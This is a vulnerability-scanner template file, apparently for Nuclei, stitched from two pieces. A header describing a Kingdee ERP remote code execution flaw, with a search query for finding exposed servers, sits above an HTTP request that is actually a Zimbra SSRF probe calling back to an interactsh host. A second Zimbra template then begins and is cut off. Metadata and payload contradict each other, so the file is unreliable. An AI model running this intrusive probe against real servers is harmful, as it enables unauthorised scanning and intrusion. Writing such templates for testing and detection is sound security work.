id: kingdee-erp-rce
info:
  author: SleepingBag945
  description: 'Kingdee OA Yunxingkong has a remote command execution vulnerability.
    This vulnerability is caused by the fact that the communication layer of Kingdee
    Cloud Starry Sky Management Center adopts binary data format by default, which
    requires serialization and deserialization. No signature or verification is performed
    during this communication process, leading to malicious exploitation.

    '
  metadata:
    fofa-query: app="金蝶云星空-管理中心"
    max-request: 1
    verified: true
  name: Kingdee OA Yunxingkong kdsvc - Remote Code Execution
  reference:
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%87%91%E8%9D%B6OA/%E9%87%91%E8%9D%B6OA%20%E4%BA%91%E6%98%9F%E7%A9%BA%20kdsvc%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  severity: critical
  tags: kingdee-erp,rce,intrusive,vuln
---
http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
id: zimbra-preauth-ssrf
info:
  author: gy741
  classification:
